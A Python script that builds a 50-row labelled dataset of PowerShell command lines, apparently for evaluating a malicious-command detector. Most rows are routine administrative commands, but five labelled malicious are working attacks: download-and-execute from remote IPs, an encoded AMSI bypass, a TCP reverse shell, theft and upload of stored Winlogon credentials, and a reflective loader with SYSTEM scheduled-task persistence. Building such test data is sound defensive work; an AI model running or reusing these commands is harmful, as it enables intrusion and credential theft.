#!/usr/bin/env python3
"""Create a 50-row PowerShell sample dataset for detector evaluation."""

from __future__ import annotations

import csv
from pathlib import Path


BENIGN = [
    "powershell.exe -NonInteractive -NoProfile -ExecutionPolicy AllSigned -Command \"& 'C:\\Scripts\\Backup\\RunNightlyBackup.ps1'\"",
    "PowerShell -NoProfile -ExecutionPolicy Bypass -Command \"& 'O:\\PROG\\Finance\\GenerateMonthlyReport.ps1' -Month 03 -Year 2025\"",
    "powershell -executionpolicy bypass -file \"O:\\Finance GL\\Common\\Scripts\\XFB_RECEIVE_NLX06017.PS1\"",
    "powershell -executionpolicy bypass -file \"D:\\Automation\\Scripts\\SyncActiveDirectory.ps1\"",
    "powershell.exe -NonInteractive -ExecutionPolicy AllSigned -File \"C:\\IT\\Deploy\\PushSoftwareUpdate.ps1\"",
    "PowerShell -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -File \"C:\\Ops\\Monitoring\\CheckDiskHealth.ps1\"",
    "powershell.exe -command \"O:\\SPaaS\\SPaaSScheduler\\Scripts\\IPCSelfService\\ProcessOrders.ps1\"",
    "PowerShell -NoProfile -ExecutionPolicy Bypass -Command \"& 'O:\\PROG\\HR\\ExportEmployeeData.ps1' -Format CSV\"",
    "powershell -file \"C:\\Maintenance\\CleanTempFiles.ps1\" -OlderThanDays 30",
    "powershell.exe -ExecutionPolicy AllSigned -NoProfile -File \"C:\\Deploy\\InstallAgent.ps1\" -Silent",
    "C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command \"& {$OutputEncoding = [Console]::OutputEncoding = [System.Text.Encoding]::UTF8; . 'C:\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection\\DataCollection\\script01.ps1'}\"",
    "C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -Command \". 'P:\\Agent2\\_work\\_temp\\5c3a9f21-1234-48ab-bc12-d9e0f1234567.ps1'\"",
    "C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -Command \". 'P:\\Agent2\\_work\\_temp\\7b2d1e45-5678-42cd-de34-f0a1b2345678.ps1'\"",
    "\"C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command \"& {$hash = Get-FileHash 'C:\\ProgramData\\Microsoft\\Windows Defender\\DataCollection\\abc123.ps1' -Algorithm SHA256; if($hash.Hash -ne 'aabbcc'){exit 1}}\"",
    "PowerShell -NoProfile -ExecutionPolicy Bypass -Command \"& 'O:\\PROG\\General\\MRLS/Sql-AgentJob-Execution.ps1' -ServerName 'prod-db-01.corp.net' -JobNameList 'ETL_Load_Daily' -synchronousMode '1'\"",
    "powershell.exe -NonInteractive -Command \"Invoke-Sqlcmd -ServerInstance 'sqlprod01' -Database 'Finance' -Query 'EXEC sp_RunDailyETL'\"",
    "PowerShell -NoProfile -ExecutionPolicy Bypass -File \"D:\\DBMaint\\RebuildIndexes.ps1\" -Server \"sqlprod02\" -Database \"HR\"",
    "powershell.exe -command $input | \"D:\\Apps\\SplunkUniversalForwarder\\bin\\splunk-powershell.ps1\" \"D:\\Apps\\SplunkUniversalForwarder\" 40305a6d96b95b62",
    "powershell.exe -NonInteractive -File \"C:\\SplunkForwarder\\scripts\\CollectEventLogs.ps1\" -LogName Security -MaxEvents 1000",
    "\"C:\\Program Files (x86)\\Google\\GoogleUpdater\\144.0.7547.0\\updater.exe\" --crash-handler --system \"--database=C:\\Program Files (x86)\\Google\\GoogleUpdater\\144.0.7547.0\\Crashpad\" --url=https://clients2.google.com/cr/report",
    "PowerShell -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand UwBlAHQALQBTAHQAcgBpAGMAdABNAG8AZABlACAALQBWAGUAcgBzAGkAbwBuACAATABhAHQAZQBzAHQA",
    "powershell.exe -EncodedCommand JABwAGEAdABoACAAPQAgACcAQwA6AFwAVABlAG0AcABcAGkAbgBzAHQAYQBsAGwALgBsAG8AZwAnAA==",
    "powershell.exe -Command \"Get-ChildItem -Path 'D:\\Logs' -Filter '*.log' -Recurse | Where-Object {$_.LastWriteTime -lt (Get-Date).AddDays(-90)} | Remove-Item -Force\"",
    "powershell -Command \"Compress-Archive -Path 'C:\\Reports\\2024\\' -DestinationPath 'C:\\Archive\\Reports_2024.zip'\"",
    "powershell.exe -Command \"Copy-Item -Path '\\\\fileserver01\\share\\configs\\*' -Destination 'C:\\LocalConfigs\\' -Recurse -Force\"",
    "PowerShell -Command \"Get-Service | Where-Object {$_.Status -eq 'Stopped'} | Export-Csv 'C:\\Reports\\StoppedServices.csv' -NoTypeInformation\"",
    "powershell.exe -Command \"Import-Module ActiveDirectory; Get-ADUser -Filter * -SearchBase 'OU=Staff,DC=corp,DC=local' | Export-Csv C:\\Reports\\AllStaff.csv\"",
    "powershell -NonInteractive -Command \"Test-NetConnection -ComputerName prod-web-01.corp.net -Port 443\"",
    "powershell.exe -File \"C:\\IT\\Network\\ScanOpenPorts.ps1\" -TargetSubnet \"192.168.1.0/24\"",
    "PowerShell -Command \"Get-ADGroupMember -Identity 'Domain Admins' | Select Name, SamAccountName | Export-Csv 'C:\\Audit\\DomainAdmins.csv'\"",
    "powershell -ExecutionPolicy Bypass -File \"C:\\WSUS\\Scripts\\ApproveUpdates.ps1\" -ClassificationID Security",
    "powershell.exe -NonInteractive -File \"D:\\PatchMgmt\\RunWindowsUpdate.ps1\" -AutoReboot $false",
    "powershell.exe -Command \"Connect-AzAccount -ServicePrincipal -Credential $cred -TenantId 'tenant-id-here'; Get-AzVM | Select Name, Location | Export-Csv C:\\Reports\\AzureVMs.csv\"",
    "PowerShell -File \"C:\\CloudOps\\SyncBlobStorage.ps1\" -StorageAccount \"corpstorageacct\" -Container \"backups\"",
    "\"cmd.exe\" /s /c \"Scripts\\KFXConverter.bat \\\"C:\\ProgramData\\Kofax\\KIC-ED\\MC\\Blobs\\inputfile.pdf\\\" \\\"C:\\ProgramData\\Kofax\\KIC-ED\\MC\\Blobs\\outputfile.PDF\\\" \\\"\\\" \\\"PDFA2BN\\\" \\\"0\\\"\"",
    "forfiles /p \"D:\\OneBank\\Offline\\PRD\\Gateway\\Download\\CROR\" /c \"cmd /c if not exist \\\"D:\\Backup\\CROR\\\\@file.lock\\\" (move /y @file ..\\)\"",
    "PowerShell -NoProfile -ExecutionPolicy Bypass -Command \"Send-MailMessage -To ops@corp.net -From monitor@corp.net -Subject 'Daily Job Complete' -Body 'All jobs ran successfully' -SmtpServer mailrelay.corp.net\"",
    "powershell.exe -Command \"Restart-Service -Name 'W3SVC' -Force; Write-EventLog -LogName Application -Source 'OpsScript' -EntryType Information -EventId 1000 -Message 'IIS restarted'\"",
    "PowerShell -File \"O:\\TripleA\\PRD\\BIN\\DeployRelease.ps1\" -Version \"2.4.1\" -Environment PRD -Confirm:$false",
    "powershell -NonInteractive -Command \"Import-Module Pester; Invoke-Pester -Path C:\\Tests\\ -OutputFile C:\\Reports\\TestResults.xml -OutputFormat NUnitXml\"",
    "powershell.exe -ExecutionPolicy Bypass -Command \"& {Import-Module SQLPS; Backup-SqlDatabase -ServerInstance 'sqlprod01' -Database 'Finance' -BackupFile 'D:\\Backups\\Finance.bak'}\"",
    "PowerShell -NoProfile -Command \"Get-WinEvent -LogName Security -MaxEvents 500 | Where-Object {$_.Id -eq 4625} | Export-Csv C:\\Audit\\FailedLogins.csv -NoTypeInformation\"",
    "\"C:\\WINDOWS\\system32\\cmd.exe\" /c powershell %IFSSCDIR%/IFSYS_WF_LOAD IUSWFACK DFFT0043202602092330ACK_100014373887",
    "Dserui.exe \\\\.\\pipe\\DserNamePipeR23783 \\\\.\\pipe\\DserNamePipeW9901 Global\\DserUIIsStarted23783 1",
]

MALICIOUS = [
    "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/stage2.ps1')\"",
    "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAG8AbgB0AGUAbgB0ACAAPQAgACcAWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAgAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
    "powershell -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('185.220.101.12',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
    "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"$u=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon').DefaultUserName;$p=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon').DefaultPassword;$c=New-Object Net.WebClient;$c.UploadString('http://185.220.101.33/collect',\\\"user=$u&pass=$p\\\")\"",
    "powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"$a=[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('http://10.0.0.99/dropper.b64')));$a.EntryPoint.Invoke($null,$null);schtasks /create /tn \\\"WindowsUpdateHelper\\\" /tr \\\"powershell -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.99/persist.ps1')\\\" /sc onlogon /ru SYSTEM /f\"",
]


def main() -> int:
    all_samples = (
        [{"script": s, "label": "benign", "is_malicious": 0} for s in BENIGN]
        + [{"script": s, "label": "malicious", "is_malicious": 1} for s in MALICIOUS]
    )

    output_path = Path("data/raw/ps_samples_50.csv")
    output_path.parent.mkdir(parents=True, exist_ok=True)

    with output_path.open("w", newline="", encoding="utf-8") as handle:
        writer = csv.DictWriter(handle, fieldnames=["script", "label", "is_malicious"])
        writer.writeheader()
        writer.writerows(all_samples)

    print(f"Written {len(all_samples)} samples to {output_path}")
    print(f"  Benign:    {sum(1 for row in all_samples if row['is_malicious'] == 0)}")
    print(f"  Malicious: {sum(1 for row in all_samples if row['is_malicious'] == 1)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
